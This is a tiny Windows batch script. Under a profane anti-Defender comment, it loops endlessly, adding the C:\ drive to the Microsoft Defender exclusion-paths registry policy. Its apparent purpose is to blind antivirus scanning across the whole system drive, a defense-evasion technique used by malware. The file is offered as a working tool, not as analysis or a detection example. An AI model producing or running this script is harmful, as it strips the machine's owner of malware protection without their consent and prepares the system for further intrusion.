@echo off
:: FUCK DEFENDER ZK
:fd
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\
goto fd